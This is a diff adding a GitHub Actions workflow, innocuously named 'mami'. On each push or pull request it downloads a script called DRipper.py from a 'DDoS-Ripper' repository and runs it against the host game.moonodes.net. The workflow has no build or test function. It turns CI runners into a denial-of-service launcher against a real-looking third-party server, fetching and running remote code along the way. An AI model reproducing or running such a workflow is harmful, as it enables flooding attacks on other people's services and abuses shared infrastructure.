@@ -1,0 +1,27 @@
+name: mami
+
+on: [push, pull_request]
+
+jobs:
+  setup:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Set up Python
+      uses: actions/setup-python@v3
+      with:
+        python-version: 3.x
+
+    - name: Install wget, git, iputils-ping
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y wget git iputils-ping
+
+    - name: Download mami
+      run: |
+        wget https://raw.githubusercontent.com/palahsu/DDoS-Ripper/main/DRipper.py -O mami.py
+
+    - name: Run mami
+      run: |
+        python3 mami.py -s game.moonodes.net -t 135
+        
